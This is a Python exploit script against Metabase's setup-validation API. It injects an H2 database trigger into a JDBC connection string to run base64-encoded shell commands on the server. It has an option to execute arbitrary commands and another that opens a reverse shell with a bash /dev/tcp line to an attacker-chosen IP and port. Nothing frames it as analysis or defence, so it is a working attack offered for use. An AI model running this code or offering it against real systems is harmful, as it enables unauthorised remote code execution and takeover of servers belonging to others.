import requests
import sys
import base64
import random
from string import ascii_uppercase


def command_encoding(payload: str) -> str:
    encoded_payload = base64.b64encode(payload.encode('ascii')).decode()
    equals_count = encoded_payload.count('=')

    if equals_count > 0:
        payload += ' ' * equals_count
        encoded_payload = base64.b64encode(payload.encode('ascii')).decode()

    return encoded_payload


if len(sys.argv) < 5:
    print("Usage: python3 metabase_exploit.py <URL> <TOKEN> <OPTION> <COMMAND>\n\nOptions:\nexec => Execute commands\n"
          "python3 metabase_exploit.py <URL> <TOKEN> exec <COMMAND>\n\n\nrevshell => Reverse Shell\n"
          "python3 metabase_exploit.py <URL> <TOKEN> revshell <IP:PORT>")
    sys.exit(1)

url = sys.argv[1].rstrip('/')  # Remove trailing slash if present
token = sys.argv[2]
action = sys.argv[3]
command = sys.argv[4]

if action == "exec" and len(sys.argv) < 5:
    print("Usage: python3 metabase_exploit.py <URL> <TOKEN> exec <COMMAND>")
    sys.exit(1)

if action == "revshell" and len(sys.argv) < 5:
    print("Usage: python3 metabase_exploit.py <URL> <TOKEN> revshell <IP:PORT>")
    sys.exit(1)

if action == "exec":
    command = sys.argv[4]

if action == "revshell":
    ip_port = sys.argv[4]
    ip, port = ip_port.split(":")
    command = f'bash -i >& /dev/tcp/{ip}/{port} 0>&1'

encoded_command = command_encoding(command)

url = f'{url}/api/setup/validate'

headers = {
    "Content-Type": "application/json",
    "Connection": "close"
}

payload = {
    "token": token,
    "details": {
        "details": {
            "db": "zip:/app/metabase.jar!/sample-database.db;TRACE_LEVEL_SYSTEM_OUT=0\\;CREATE TRIGGER {random_string} "
                  "BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec"
                  "('bash -c {{echo,{command}}}|{{base64,-d}}|{{bash,-i}}')\n"
                  "$$--=x".format(random_string=''.join(random.choice(ascii_uppercase) for i in range(12)),
                                  command=encoded_command),
            "advanced-options": False,
            "ssl": True
        },
        "name": "x",
        "engine": "h2"
    }
}

requests.post(url, json=payload, headers=headers)

print('\n\nExploit execution completed. Check the results of the executed commands.')
